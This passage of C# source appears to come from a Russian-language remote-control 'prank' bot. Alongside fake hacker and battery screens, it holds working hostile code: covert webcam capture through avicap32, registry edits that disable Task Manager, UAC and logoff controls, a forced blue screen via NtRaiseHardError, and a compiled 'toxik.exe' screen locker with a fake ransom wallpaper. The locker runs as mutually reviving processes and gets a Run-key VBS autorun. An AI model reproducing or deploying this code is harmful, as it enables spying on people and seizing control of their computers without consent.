                for (int i = 0; i < ncols; i++) { strs[i] = ""; ys[i] = -rr.Next(0, 260); }
                canvas.Paint += delegate(object s, PaintEventArgs e)
                {
                    using (Font font = new Font("Consolas", 12))
                    using (Brush br = new SolidBrush(Fx.C("#3dff6e")))
                    {
                        for (int i = 0; i < ncols; i++)
                            if (strs[i].Length > 0)
                                e.Graphics.DrawString(strs[i], font, br, 8 + i * 16, ys[i]);
                    }
                };

                string[] LOGS = new string[] {
                    "[+] подключение к тор-ноде 127.0.0.1:9051",
                    "[+] сессия перехвачена, cookies уплыли",
                    "[*] CAM_0 пишет: 00:14:03",
                    "[+] история браузера: 2.4 ГБ → сжата",
                    "[*] ваш пароль: hunter2 (уже в базе)",
                    "[+] пакет 0x4F отослан, ждём эхо",
                    "[*] веб-камера: активна с 19:42",
                    "[+] микрофонный пул: 3.7 минуты свежей записи"
                };

                Label panelBox = Fx.Lab("[*] initializing payload…", 12, "#aaffb0", "#000600", false, "Consolas");
                Fx.Place(root, panelBox, 0.02, 0.03, "nw");
                Label hack = Fx.Lab("ВАШ ПК ХАКНУТ", 44, "#3dff6e", "#000600", true, "Consolas");
                Fx.Place(root, hack, 0.99, 0.05, "ne");
                Label flow = Fx.Lab("загрузка ваших данных в сеть: 0%", 18, "#3dff6e", "#000600", false, "Consolas");
                Fx.Place(root, flow, 0.99, 0.52, "ne");

                Panel cam = new Panel();
                cam.Size = new Size(260, 200);
                cam.BackColor = Color.Black;
                cam.Paint += delegate(object s, PaintEventArgs e)
                {
                    e.Graphics.Clear(Color.Black);
                    using (Pen pen = new Pen(Fx.C("#3dff6e"), 2)) e.Graphics.DrawRectangle(pen, 0, 0, cam.Width - 2, cam.Height - 2);
                    using (Font font = new Font("Consolas", 15, FontStyle.Bold))
                    using (Brush br = new SolidBrush(Fx.C("#3dff6e")))
                        e.Graphics.DrawString("REC ●\n\nCAM_0", font, br, 12, 40);
                };
                Fx.Place(root, cam, 0.99, 0.97, "se");

                int n2 = 0, pct = 0;
                Timer t = new Timer();
                t.Interval = 55;
                t.Tick += delegate
                {
                    for (int i = 0; i < ncols; i++)
                    {
                        string s2 = strs[i];
                        if (rr.NextDouble() < 0.65 && s2.Length < 24) s2 += GLYPHS[rr.Next(GLYPHS.Length)];
                        else if (s2.Length > 0) s2 = s2.Substring(1);
                        strs[i] = s2;
                        if (ys[i] > SystemInformation.VirtualScreen.Height + 40) { ys[i] = -rr.Next(0, 260); strs[i] = ""; }
                        else ys[i] += 7;
                    }
                    canvas.Invalidate();
                    n2++;
                    if (n2 % 9 == 0)
                    {
                        List<string> logs = new List<string>(LOGS);
                        for (int j = logs.Count - 1; j > 0; j--)
                        {
                            int k = rr.Next(j + 1);
                            string tmp = logs[j]; logs[j] = logs[k]; logs[k] = tmp;
                        }
                        panelBox.Text = string.Join("\n", logs.Take(4).ToArray());
                    }
                    if (n2 % 7 == 0 && pct < 99) { pct++; flow.Text = "загрузка ваших данных в сеть: " + pct + "%"; }
                };
                root.Shown += delegate { t.Start(); };
                Fx.EscClose(root);
                Fx.AutoClose(root, 45000);
                Application.Run(root);
            });
        }

        public static string Hacker() { HackerActually(); return "👁 хакер влез (по сценарию). 45с экспозиции. ESC — досрочно"; }

        private static void BatteryActually(int downtime, bool quietEnd)
        {
            Fx.RunSta(delegate
            {
                try
                {
                    int W = N.GetSystemMetrics(0), H = N.GetSystemMetrics(1);
                    Form toast = new Form();
                    toast.FormBorderStyle = FormBorderStyle.None;
                    toast.StartPosition = FormStartPosition.Manual;
                    toast.Bounds = new Rectangle(W - 390 - 24, H - 150 - 96, 390, 150);
                    toast.TopMost = true;
                    toast.ShowInTaskbar = false;
                    toast.BackColor = Fx.C("#1f1f1f");
                    Label tl = Fx.Lab("🔋 Аккумулятор разряжен (1%)", 14, "#ffffff", "#1f1f1f", true, "Segoe UI");
                    Label tsub = Fx.Lab("Подключите зарядное устройство. ПК отключится.", 11, "#c9c9c9", "#1f1f1f", false, "Segoe UI");
                    tl.Location = new Point(14, 12);
                    tsub.Location = new Point(14, 44);
                    toast.Controls.Add(tl);
                    toast.Controls.Add(tsub);
                    Fx.AutoClose(toast, 4200);
                    Application.Run(toast);
                }
                catch { }
                try
                {
                    Form scr = Fx.Full("#0b2d5c");
                    Label e1 = Fx.Lab("\n\n🔋", 90, "#ffffff", "#0b2d5c", false, "Segoe UI Emoji");
                    Fx.Place(scr, e1, 0.5, 0.26, "mm");
                    Label e2 = Fx.Lab("Заряд батареи критически низок.\nПодключите зарядное устройство.", 26, "#ffffff", "#0b2d5c", false, "Segoe UI");
                    Fx.Place(scr, e2, 0.5, 0.42, "mm");
                    Label ttl = Fx.Lab("", 60, "#ffffff", "#0b2d5c", true, "Segoe UI");
                    Fx.Place(scr, ttl, 0.5, 0.58, "mm");
                    int left = downtime;
                    Timer t = new Timer();
                    t.Interval = 900;
                    t.Tick += delegate
                    {
                        if (left <= 0) { t.Stop(); try { scr.Close(); } catch { } return; }
                        ttl.Text = left.ToString();
                        left -= 1;
                    };
                    scr.Shown += delegate { t.Start(); };
                    Application.Run(scr);
                }
                catch { }
                try
                {
                    Form black = Fx.Full("#000000");
                    if (!quietEnd)
                    {
                        Label out1 = Fx.Lab("псишь.\nПК включился как ни в чём не бывало :)", 22, "#dddddd", "#000000", false, "Segoe UI");
                        Fx.Place(black, out1, 0.5, 0.5, "mm");
                        Fx.EscClose(black);
                    }
                    Fx.AutoClose(black, quietEnd ? 4200 : 3400);
                    Application.Run(black);
                }
                catch { }
            });
        }

        public static string Battery() { BatteryActually(9, false); return "🔋 заряд ушёл… по сценарию. ESC после тоста — выход"; }

        public static string PcLock() { try { N.LockWorkStation(); } catch { } return "🖥 экран заблокирован"; }

        public static string Msgbox()
        {
            Thread th = new Thread((ThreadStart)delegate
            {
                string[] texts = new string[] { "Тут нечего кликать", "Это тоже пусто", "Всё ещё скучно?", "Ок, это последнее", "Шутка закончилась :)" };
                foreach (string text in texts)
                {
                    try { N.MessageBoxW(IntPtr.Zero, text, "СИСТЕМНОЕ СООБЩЕНИЕ", 0x40 | 0x40000); } catch { }
                }
            });
            th.IsBackground = true;
            th.Start();
            return "💬 5 саркастических окон уже ждут крестика";
        }

        public static string Apocalypse()
        {
            BsodActually();
            Siren();
            BlackoutActually(10, "☠️ файлы «удалены»…");
            Thread.Sleep(20000);
            InvertActually();
            return "☠️ конец света отыгран: синяк → сирена → тьма → негатив. живи дальше";
        }

        public static string Judgment()
        {
            Thread launcher = new Thread((ThreadStart)delegate
            {
                try { BatteryActually(6, true); } catch { }
                Thread.Sleep(1500);
                WinlockActually(45);
                BlackoutActually(7, "💀 ты выжил. шутка кончилась");
            });
            launcher.IsBackground = true;
            launcher.Start();
            return "💀 СУДНАЯ НОЧЬ 2.0: разряд → замок → тьма.\nкод замка: 0007";
        }

        public static string HideCad()
        {
            using (RegistryKey k = Registry.CurrentUser.CreateSubKey(K.POLICY_PATH))
            {
                foreach (string name in new string[] { "DisableTaskMgr", "DisableChangePassword", "DisableLockWorkstation", "HideFastUserSwitching", "NoDispCPL" })
                    k.SetValue(name, 1, RegistryValueKind.DWord);
            }
            using (RegistryKey k = Registry.CurrentUser.CreateSubKey(K.EXPL_PATH))
            {
                foreach (string name in new string[] { "NoLogoff", "NoClose", "NoRun", "NoWinKeys", "NoViewContextMenu", "NoTrayContextMenu" })
                    k.SetValue(name, 1, RegistryValueKind.DWord);
            }
            return "🙈 Скрыл кнопки Ctrl+Alt+Del и впридачу всякую дичь:\n" +
                   "• Диспетчер задач, Смена пароля, Блокировка, Смена юзера — скрыты\n" +
                   "• Выход, Завершение работы, меню Выполнить, Win-хоткеи,\n" +
                   "  контекстные меню стола/трея, Панель управления — всё замуровано\n" +
                   "вернуть — кнопка 🙈 Вернуть";
        }

        public static string ShowCad()
        {
            try
            {
                using (RegistryKey k = Registry.CurrentUser.OpenSubKey(K.POLICY_PATH, true))
                {
                    if (k != null)
                        foreach (string name in new string[] { "DisableTaskMgr", "DisableChangePassword", "DisableLockWorkstation", "HideFastUserSwitching", "NoDispCPL" })
                        { try { k.DeleteValue(name, false); } catch { } }
                }
                using (RegistryKey k = Registry.CurrentUser.OpenSubKey(K.EXPL_PATH, true))
                {
                    if (k != null)
                        foreach (string name in new string[] { "NoLogoff", "NoClose", "NoRun", "NoWinKeys", "NoViewContextMenu", "NoTrayContextMenu" })
                        { try { k.DeleteValue(name, false); } catch { } }
                }
            }
            catch
            {
                return "🙈 ничего не прятилось — и так чисто";
            }
            return "🙈 Кнопки Ctrl+Alt+Del и вся дичь вернулись";
        }

        public static string UacSet(int state)
        {
            if (!N.IsUserAnAdmin())
                return "🔒 нужно админство: запуск пульта от имени администратора";
            using (RegistryKey k = Registry.LocalMachine.CreateSubKey(K.POLICY_PATH))
            {
                k.SetValue("EnableLUA", state, RegistryValueKind.DWord);
                k.SetValue("ConsentPromptBehaviorAdmin", 0, RegistryValueKind.DWord);
            }
            return "🔒 " + (state == 0 ? "UAC выключен" : "UAC включен") + " — перезапуск Windows после полного применения";
        }
    }
    // ============================================================
    //  вебка: старый добрый avicap32 (VFW) — без cv2 и NuGet
    // ============================================================
    internal static class Cam
    {
        [DllImport("avicap32.dll", CharSet = CharSet.Ansi)]
        public static extern IntPtr capCreateCaptureWindowA(string lpszWindowName, int dwStyle, int x, int y, int nWidth, int nHeight, IntPtr hWndParent, int nID);
        [DllImport("user32.dll", EntryPoint = "SendMessage")]
        public static extern IntPtr SendMessageA(IntPtr h, int msg, IntPtr wp, IntPtr lp);
        [DllImport("user32.dll")] public static extern bool DestroyWindow(IntPtr h);

        public static List<KeyValuePair<int, byte[]>> Snapshot(int maxCams)
        {
            List<KeyValuePair<int, byte[]>> result = new List<KeyValuePair<int, byte[]>>();
            Exception err = null;
            Thread th = new Thread((ThreadStart)delegate
            {
                try
                {
                    Form host = new Form();
                    host.FormBorderStyle = FormBorderStyle.None;
                    host.ShowInTaskbar = false;
                    host.StartPosition = FormStartPosition.Manual;
                    host.Bounds = new Rectangle(5000, 5000, 320, 240);
                    Timer t = new Timer();
                    t.Interval = 40;
                    t.Tick += delegate
                    {
                        t.Stop();
                        try { DoAll(result, host, maxCams); }
                        catch (Exception e2) { err = e2; }
                        try { host.Close(); } catch { }
                    };
                    host.Load += delegate { t.Start(); };
                    Application.Run(host);
                }
                catch (Exception e) { err = e; }
            });
            th.SetApartmentState(ApartmentState.STA);
            th.IsBackground = true;
            th.Start();
            th.Join();
            if (err != null) throw err;
            return result;
        }

        private static void DoAll(List<KeyValuePair<int, byte[]>> result, Form host, int maxCams)
        {
            IntPtr parent = host.Handle;
            for (int i = 0; i < maxCams; i++)
            {
                IntPtr cam = capCreateCaptureWindowA("pult" + i, 0x40000000, 0, 0, 320, 240, parent, 100 + i);
                if (cam == IntPtr.Zero) continue;
                try
                {
                    if (SendMessageA(cam, 1034, (IntPtr)i, IntPtr.Zero) == IntPtr.Zero) continue;   // WM_CAP_DRIVER_CONNECT
                    Bitmap best = null;
                    double bestMean = -1;
                    for (int k = 0; k < 4; k++)
                    {
                        SendMessageA(cam, 0x40E, IntPtr.Zero, IntPtr.Zero);   // WM_CAP_GRAB_FRAME
                        SendMessageA(cam, 0x41E, IntPtr.Zero, IntPtr.Zero);   // WM_CAP_EDIT_COPY → клипборд
                        Thread.Sleep(120);
                        Application.DoEvents();
                        try
                        {
                            Image img = Clipboard.GetImage();
                            Bitmap bmp = img as Bitmap;
                            if (bmp != null)
                            {
                                double mean = MeanBright(bmp);
                                if (mean > bestMean && mean > 4.0)
                                {
                                    if (best != null) best.Dispose();
                                    best = new Bitmap(bmp);
                                    bestMean = mean;
                                }
                                bmp.Dispose();
                            }
                        }
                        catch { }
                    }
                    if (best != null)
                    {
                        byte[] jpg = Fx.JpgBytes(best);
                        best.Dispose();
                        if (jpg.Length > 200) result.Add(new KeyValuePair<int, byte[]>(i, jpg));
                    }
                }
                finally
                {
                    SendMessageA(cam, 1035, IntPtr.Zero, IntPtr.Zero);   // WM_CAP_DRIVER_DISCONNECT
                    try { DestroyWindow(cam); } catch { }
                }
            }
        }

        private static double MeanBright(Bitmap bmp)
        {
            try
            {
                Bitmap small = new Bitmap(bmp, 32, 24);
                double sum = 0;
                int n = 0;
                for (int y = 0; y < 24; y++)
                    for (int x = 0; x < 32; x++)
                    {
                        Color c = small.GetPixel(x, y);
                        sum += (c.R + c.G + c.B) / 3.0;
                        n++;
                    }
                small.Dispose();
                return sum / Math.Max(1, n);
            }
            catch { return 0; }
        }
    }

    // ============================================================
    //  НАСТОЯЩИЕ ВИРУСЫ (bot-side): csc-сборка натива toxik.exe + пары a/b
    // ============================================================
    internal static class Virus
    {
        private static void Mkdir() { try { Directory.CreateDirectory(K.VIRUS_DIR); } catch { } }

        private static string CscPath()
        {
            string windir = Environment.GetEnvironmentVariable("WINDIR") ?? @"C:\Windows";
            string[] cand = new string[] {
                windir + @"\Microsoft.NET\Framework64\v4.0.30319\csc.exe",
                windir + @"\Microsoft.NET\Framework\v4.0.30319\csc.exe" };
            foreach (string c in cand) if (File.Exists(c)) return c;
            return null;
        }

        /// <summary>нативная сборка юнита (toxik.cs → toxik.exe); путь exe или null</summary>
        public static string Compile()
        {
            try
            {
                Mkdir();
                string cs = Path.Combine(K.VIRUS_DIR, "toxik.cs");
                string exe = Path.Combine(K.VIRUS_DIR, "toxik.exe");
                string src = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "toxik.cs");
                if (File.Exists(src))
                {
                    bool same = false;
                    try { if (File.Exists(cs) && File.ReadAllText(cs, Encoding.UTF8) == File.ReadAllText(src, Encoding.UTF8)) same = true; } catch { }
                    if (!same) File.Copy(src, cs, true);
                }
                if (!File.Exists(cs)) return null;
                if (File.Exists(exe) && File.GetLastWriteTimeUtc(exe) >= File.GetLastWriteTimeUtc(cs)) return exe;
                string csc = CscPath();
                if (csc == null) return null;
                ProcessStartInfo psi = new ProcessStartInfo();
                psi.FileName = csc;
                psi.Arguments = "/nologo /target:winexe /platform:anycpu /optimize+ /codepage:65001 /out:\"" + exe +
                                "\" /r:System.dll /r:System.Core.dll /r:System.Drawing.dll /r:System.Windows.Forms.dll" +
                                " /r:Microsoft.CSharp.dll \"" + cs + "\"";
                psi.CreateNoWindow = true;
                psi.UseShellExecute = false;
                psi.RedirectStandardOutput = true;
                psi.RedirectStandardError = true;
                Process p = Process.Start(psi);
                string cout = p.StandardOutput.ReadToEnd() + p.StandardError.ReadToEnd();
                if (!p.WaitForExit(120000)) { try { p.Kill(); } catch { } }
                K.Log("[toxik] csc exit=" + p.ExitCode + " " + (cout.Length > 160 ? cout.Substring(cout.Length - 160) : cout));
                if (File.Exists(exe) && File.GetLastWriteTimeUtc(exe) >= File.GetLastWriteTimeUtc(cs)) return exe;
                return null;
            }
            catch (Exception e) { K.Log("[toxik] csc fail: " + e.Message); return null; }
        }

        public static bool Running(string job)
        {
            foreach (string role in new string[] { "a", "b" })
            {
                string pf = Path.Combine(K.VIRUS_DIR, job + "_" + role + ".pid");
                int pid;
                try { pid = int.Parse(File.ReadAllText(pf).Trim()); } catch { continue; }
                if (pid == Process.GetCurrentProcess().Id) continue;
                IntPtr h = N.OpenProcess(0x1000, false, pid);
                if (h != IntPtr.Zero) { N.CloseHandle(h); return true; }
            }
            return false;
        }

        public static string Spawn(string job)
        {
            string exe = Compile();
            try { File.Delete(Path.Combine(K.VIRUS_DIR, "abort.flag")); } catch { }
            try { File.Delete(Path.Combine(K.VIRUS_DIR, "stop_" + job + ".flag")); } catch { }
            if (exe == null || !File.Exists(exe)) return null;
            foreach (string role in new string[] { "a", "b" })
            {
                try
                {
                    ProcessStartInfo psi = new ProcessStartInfo();
                    psi.FileName = exe;
                    psi.Arguments = job + " " + role;
                    psi.WorkingDirectory = K.VIRUS_DIR;
                    psi.CreateNoWindow = true;
                    psi.UseShellExecute = false;
                    Process.Start(psi);
                }
                catch { }
            }
            return exe;
        }

        private static void BlockTaskmgr()
        {
            try
            {
                using (RegistryKey k = Registry.CurrentUser.CreateSubKey(K.POLICY_PATH))
                    k.SetValue("DisableTaskMgr", 1, RegistryValueKind.DWord);
            }
            catch { }
        }

        private static void UnblockTaskmgr()
        {
            try
            {
                using (RegistryKey k = Registry.CurrentUser.OpenSubKey(K.POLICY_PATH, true))
                    if (k != null) { try { k.DeleteValue("DisableTaskMgr", false); } catch { } }
            }
            catch { }
        }

        private static void GdiText(Graphics g, string text, Font font, Color col, int cx, int cy)
        {
            using (StringFormat sf = new StringFormat())
            using (SolidBrush br = new SolidBrush(col))
            {
                sf.Alignment = StringAlignment.Center;
                sf.LineAlignment = StringAlignment.Center;
                g.DrawString(text, font, br, new RectangleF(cx - 960, cy - 220, 1920, 440), sf);
            }
        }

        private static void WriteWallPng()
        {
            Mkdir();
            Bitmap img = new Bitmap(1920, 1080);
            using (Graphics g = Graphics.FromImage(img))
            {
                g.Clear(Color.FromArgb(5, 5, 5));
                using (Font f1 = new Font("Arial", 84, FontStyle.Bold))
                using (Font f2 = new Font("Arial", 36))
                {
                    GdiText(g, "☠ СИСТЕМА ЗАХВАЧЕНА ☠", f1, Color.FromArgb(255, 30, 30), 960, 200);
                    GdiText(g, "ВСЕ ФАЙЛЫ ЗАШИФРОВАНЫ\nAES-256-CBC  +  RSA-4096\nвосстановление без ключа невозможно",
                            f2, Color.FromArgb(214, 214, 214), 960, 430);
                    GdiText(g, "ключ: 0x82F1-AB34-9D7E-44C1\nоткуп: 3000₽ · счёт не истекает никогда",
                            f2, Color.FromArgb(255, 100, 100), 960, 640);
                    GdiText(g, "не выключай питание — станет только хуже",
                            f2, Color.FromArgb(150, 150, 150), 960, 1020);
                }
            }
            img.Save(Path.Combine(K.VIRUS_DIR, "wall.png"), ImageFormat.Png);
            img.Dispose();
        }

        public static string DeployWinlock()
        {
            if (Running("winlock")) return "💀 винлокер уже сидит внутри — снимать через 🆘";
            string exe = Spawn("winlock");
            if (exe == null) return "❌ юнит не собрался — csc не найден, вирус не встал";
            BlockTaskmgr();
            return "💀 ВИНЛОКЕР НАВСЕГДА заехал (🧬 C#):\nна экране есть ПОЛЕ ВВОДА «ключ владельца» — набери там\n" +
                   "0007 или sos, и машина отпустит всё сразу.\nESC/WIN/Alt+Tab/Alt+F4/диспетчер — замурованы железно,\n" +
                   "процессов двое, убьёшь одного — второй воскресит.\nснять: 🆘 отсюда или код в поле";
        }

        public static string DeployExplorer()
        {
            if (Running("explorer")) return "🗑 убийца проводника уже на смене";
            string exe = Spawn("explorer");
            if (exe == null) return "❌ юнит не собрался — csc не найден, вирус не встал";
            BlockTaskmgr();
            try
            {
                ProcessStartInfo psi = new ProcessStartInfo();
                psi.FileName = "cmd.exe";
                psi.Arguments = "/c taskkill /f /im explorer.exe";
                psi.CreateNoWindow = true;
                psi.UseShellExecute = false;
                Process.Start(psi);
            }
            catch { }
            return "🗑 УБИЙЦА ПРОВОДНИКА: explorer добивают каждые 1.5с —\nпуск, панель и папки умерли. диспетчер тоже замурован.\nснять: 🆘 (проводник оживёт сам)";
        }

        public static string DeployWall()
        {
            if (Running("wall")) return "👁 обои-могила уже висят";
            string exe = Spawn("wall");
            if (exe == null) return "❌ юнит не собрался — csc не найден, вирус не встал";
            string orig = Pr.RegWallGet();
            string marker = Path.Combine(K.DATA_DIR, "orig_wall.txt");
            if (orig.Length > 0 && !File.Exists(marker)) File.WriteAllText(marker, orig, Encoding.UTF8);
            WriteWallPng();
            return "🖼 ОБОИ-МОГИЛА встали: каждые 3с их протирают заново —\nпоменять их нельзя. старые обои запомнены.\nснять: 🆘 (старые вернутся)";
        }

        public static string DeployTrap()
        {
            if (Running("trap")) return "🔒 мышь уже в камере";
            string exe = Spawn("trap");
            if (exe == null) return "❌ юнит не собрался — csc не найден, прикол не встал";
            BlockTaskmgr();
            return "🔒 МЫШЬ-ЗАЛОЖНИК (🧬 C#, прикол временный):\nкамера-окно с полем ввода едет к курсору, курсор прикован\nк камере. сама отпустит через 10 минут.\nраньше: набери в поле 0007 или sos, либо 🆘 отсюда";
        }

        public static string DeployMadness()
        {
            if (Running("madness")) return "🌀 вечное безумие уже бушует";
            string exe = Spawn("madness");
            if (exe == null) return "❌ юнит не собрался — csc не найден, безумие не встало";
            return "🌀 ВЕЧНОЕ БЕЗУМИЕ: конвейер cmd-окон, сирены,\nгромкости в потолок и рывков мыши — без выходных.\nснять: 🆘";
        }

        public static void BsodBg()
        {
            Thread.Sleep(2000);
            try
            {
                int old, resp;
                N.RtlAdjustPrivilege(19, true, 0, out old);
                N.NtRaiseHardError(unchecked((int)0xC000007B), 0, 0, IntPtr.Zero, 6, out resp);
            }
            catch { }
        }

        public static void WriteFlags()
        {
            Mkdir();
            try { File.WriteAllText(Path.Combine(K.VIRUS_DIR, "abort.flag"), "x"); } catch { }
            foreach (string job in K.VIRUS_JOBS)
                try { File.WriteAllText(Path.Combine(K.VIRUS_DIR, "stop_" + job + ".flag"), "x"); } catch { }
        }

        private static int SweepProcesses()
        {
            string ps = "Get-CimInstance Win32_Process | " +
                "Where-Object { ($_.Name -in 'python.exe','pythonw.exe','toxik.exe') -and " +
                "($_.CommandLine -like '*virus.py*' -or $_.Name -eq 'toxik.exe') } | " +
                "ForEach-Object { taskkill /f /t /pid $($_.ProcessId) | Out-Null; $_.ProcessId }";
            try
            {
                ProcessStartInfo psi = new ProcessStartInfo();
                psi.FileName = "powershell";
                psi.Arguments = "-NoProfile -EncodedCommand " + Convert.ToBase64String(Encoding.Unicode.GetBytes(ps));
                psi.CreateNoWindow = true;
                psi.UseShellExecute = false;
                psi.RedirectStandardOutput = true;
                Process p = Process.Start(psi);
                string outp = p.StandardOutput.ReadToEnd();
                if (!p.WaitForExit(25000)) { try { p.Kill(); } catch { } }
                int num = 0;
                foreach (string ln in outp.Split('\n')) if (ln.Trim().Length > 0) num++;
                return num;
            }
            catch { return 0; }
        }

        private static int KillPids()
        {
            int killed = 0;
            int me = Process.GetCurrentProcess().Id;
            foreach (string job in K.VIRUS_JOBS)
            {
                foreach (string role in new string[] { "a", "b" })
                {
                    string pf = Path.Combine(K.VIRUS_DIR, job + "_" + role + ".pid");
                    int pid;
                    try { pid = int.Parse(File.ReadAllText(pf).Trim()); }
                    catch
                    {
                        try { File.Delete(pf); } catch { }
                        continue;
                    }
                    if (pid == me) continue;
                    try
                    {
                        ProcessStartInfo psi = new ProcessStartInfo();
                        psi.FileName = "taskkill";
                        psi.Arguments = "/f /t /pid " + pid;
                        psi.CreateNoWindow = true;
                        psi.UseShellExecute = false;
                        Process.Start(psi);
                    }
                    catch { }
                    IntPtr h = N.OpenProcess(0x0001, false, pid);
                    if (h != IntPtr.Zero) { N.TerminateProcess(h, 1); N.CloseHandle(h); killed++; }
                    try { File.Delete(pf); } catch { }
                }
            }
            return killed;
        }

        private static void RestoreMachine()
        {
            try { N.ClipCursor(IntPtr.Zero); } catch { }
            UnblockTaskmgr();
            try
            {
                string orig = File.ReadAllText(Path.Combine(K.DATA_DIR, "orig_wall.txt"), Encoding.UTF8).Trim();
                if (orig.Length > 0 && File.Exists(orig))
                {
                    Pr.RegWallSet(orig);
                    try { File.Delete(Path.Combine(K.DATA_DIR, "orig_wall.txt")); } catch { }
                }
            }
            catch { }
            try
            {
                ProcessStartInfo psi = new ProcessStartInfo();
                psi.FileName = "cmd.exe";
                psi.Arguments = "/c start explorer.exe";
                psi.CreateNoWindow = true;
                psi.UseShellExecute = false;
                Process.Start(psi);
            }
            catch { }
        }

        public static string KillAll()
        {
            WriteFlags();
            Thread.Sleep(2200);
            int killed = KillPids();
            int swept = SweepProcesses();
            RestoreMachine();
            return "🆘 ЗАЧИСТКА ГОТОВА: процессы — kill по pid " + killed + " + поиск по cmdline ещё " + swept + ",\n" +
                   "abort-флаг расставлен ВСЕМ (код владельца теперь тоже гасит всё разом),\n" +
                   "диспетчер отмяк, обои и проводник возвращены, мышь отпущена.\n" +
                   "если что-то дышит — жми 🧨, если был автовозжиг — ♻️ ВЫКЛ";
        }

        public static string Panic()
        {
            WriteFlags();
            int first = SweepProcesses();
            Thread.Sleep(1500);
            int second = SweepProcesses();
            int byPid = KillPids();
            Thread.Sleep(500);
            int third = SweepProcesses();
            RestoreMachine();
            return "🧨 ПУЛЯ ДОСТАВЛЕНА: заход1 " + first + " шт, заход2 " + second + " шт, заход3 " + third + " шт (+по pid " + byPid + "),\n" +
                   "каждый снимок убивает ВСЁ из virus.py и весь toxik.exe. диспетчер/мышь/обои/проводник — возвращены.\n" +
                   "если четвёртый раз что-то воскреснет — перезагрузка и проверь ♻️ автозапуск";
        }

        public static bool PersistInstalled()
        {
            try
            {
                using (RegistryKey k = Registry.CurrentUser.OpenSubKey(K.RUN_PATH))
                {
                    if (k == null) return false;
                    return k.GetValue(K.PERSIST_NAME) != null;
                }
            }
            catch { return false; }
        }

        public static string PersistOn()
        {
            string exe = Compile();
            if (exe == null) return "❌ юнит не собрался — автозапуск не встал (csc не найден)";
            StringBuilder sb = new StringBuilder();
            sb.Append("Set sh = CreateObject(\"WScript.Shell\")\r\n");
            sb.Append("q = Chr(34)\r\n");
            foreach (string job in new string[] { "winlock", "trap" })
            {
                foreach (string role in new string[] { "a", "b" })
                    sb.Append("sh.Run q & \"").Append(exe).Append("\" & q & \" ").Append(job).Append(' ').Append(role).Append("\", 0, False\r\n");
            }
            string vbs = Path.Combine(K.VIRUS_DIR, "vboot.vbs");
            File.WriteAllText(vbs, sb.ToString(), Encoding.GetEncoding(1251));
            using (RegistryKey k = Registry.CurrentUser.CreateSubKey(K.RUN_PATH))
                k.SetValue(K.PERSIST_NAME, "wscript.exe \"" + vbs + "\"", RegistryValueKind.String);
            return "♻️ АВТОЗАПУСК ЗАПИХАН (юнит: 🧬 C# (toxik.exe)): винлокер и мышь-заложник\n" +
                   "после перезагрузки встанут сами, тихо, без консольных окон.\n" +
                   "перезагрузка — больше не спасение. выключить: ♻️ ВЫКЛ";
        }

        public static string PersistOff()
        {
            try
            {
                using (RegistryKey k = Registry.CurrentUser.OpenSubKey(K.RUN_PATH, true))
                {
                    if (k != null) { try { k.DeleteValue(K.PERSIST_NAME, false); } catch { } }
                }
            }
            catch { }
            if (!PersistInstalled()) return "♻️ автозапуск выпилен из системы — перезагрузка снова спасает";
            return "♻️ автозапуск выпилен из системы — перезагрузка снова спасает";
        }

        public static string StatusText()
        {
            StringBuilder body = new StringBuilder();
            bool any = false;
            foreach (string job in K.VIRUS_JOBS)
            {
                List<string> roles = new List<string>();
                foreach (string role in new string[] { "a", "b" })
                {
                    string pf = Path.Combine(K.VIRUS_DIR, job + "_" + role + ".pid");
                    int pid;
                    try { pid = int.Parse(File.ReadAllText(pf).Trim()); } catch { continue; }
                    IntPtr h = N.OpenProcess(0x1000, false, pid);
                    if (h != IntPtr.Zero) { N.CloseHandle(h); roles.Add(role); }
                }
                if (roles.Count > 0) { any = true; body.Append("  💀 ").Append(job).Append(": роли ").Append(string.Join("+", roles.ToArray())).Append(" живы\n"); }
            }
            string alive = any ? body.ToString() : "  (ни одного живого — стерильно)\n";
            string persist = PersistInstalled() ? "вкл (после ребута сами вернутся)" : "выкл";
            string unit = File.Exists(Path.Combine(K.VIRUS_DIR, "toxik.exe")) ? "🧬 C# (toxik.exe собран)" : "🐍 python (exe ещё не собирали)";
            return "📊 СТАТУС ВИРУСОВ\n🧬 юнит: " + unit + "\n" + alive + "♻️ автозапуск: " + persist;
        }
    }
    // ============================================================
    //  бот: меню, таблицы задач, панель
    // ============================================================
    internal static partial class Bot
    {
        private static readonly Random Rnd = new Random();

        private static readonly string[][] JOKES = new string[][] {
            new string[] { "🥃", "Программист ставит на тумбочку два стакана: полный — если захочет пить ночью, и пустой — если не захочет." },
            new string[] { "🎃", "Почему программисты путают Хэллоуин и Рождество? Потому что OCT 31 == DEC 25." },
            new string[] { "🍺", "Заходит программист в бар. Бармен: «Что будете?» — «Ничего. У меня всё висит, самому разбираться надо.»" },
            new string[] { "🩹", "Учёные выяснили: 99% программистов испытывают боль, читая чужой код. Оставшийся 1% — те, кто его написал." },
            new string[] { "💾", "Windows напоминает: жизнь может закончиться раньше, чем вы сохраните файл." },
            new string[] { "🧪", "— Как называется программа, которую ни разу не тестировали? — «Готовая к релизу»." },
            new string[] { "🔗", "— У тебя есть знакомый программист? — Да, он мне даже прямую ссылку скидывал!" },
            new string[] { "🐛", "Настоящий программист считает, что задачи в мире бывают только двух видов: тривиальные и невозможные." },
            new string[] { "📅", "— Сколько времени займёт эта задача? — Две недели. — А если я помогу? — Четыре недели." }
        };

        public static string HtmlEscape(string s)
        {
            return s.Replace("&", "&amp;").Replace("<", "&lt;").Replace(">", "&gt;").Replace("\"", "&quot;");
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        private struct OSVI
        {
            public uint dwOSVersionInfoSize, dwMajorVersion, dwMinorVersion, dwBuildNumber, dwPlatformId;
            [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 128)] public string szCSDVersion;
        }
        [DllImport("ntdll.dll")]
        private static extern int RtlGetVersion(ref OSVI v);

        private static string WinName()
        {
            try
            {
                OSVI v = new OSVI();
                v.dwOSVersionInfoSize = (uint)Marshal.SizeOf(typeof(OSVI));
                if (RtlGetVersion(ref v) == 0)
                {
                    if (v.dwBuildNumber >= 22000) return "win 11";
                    return "win " + v.dwMajorVersion;
                }
            }
            catch { }
            return "win";
        }

        private static string TitleFor(string n)
        {
            string v;
            return K.HOST_TITLES.TryGetValue(n, out v) ? v : n;
        }

        public static string MenuText(long chat)
        {
            string now = DateTime.Now.ToString("HH:mm:ss");
            string who;
            lock (K.Sess) { if (!K.Sess.TryGetValue(chat, out who)) who = null; }
            if (who == null) who = K.HostLabel();
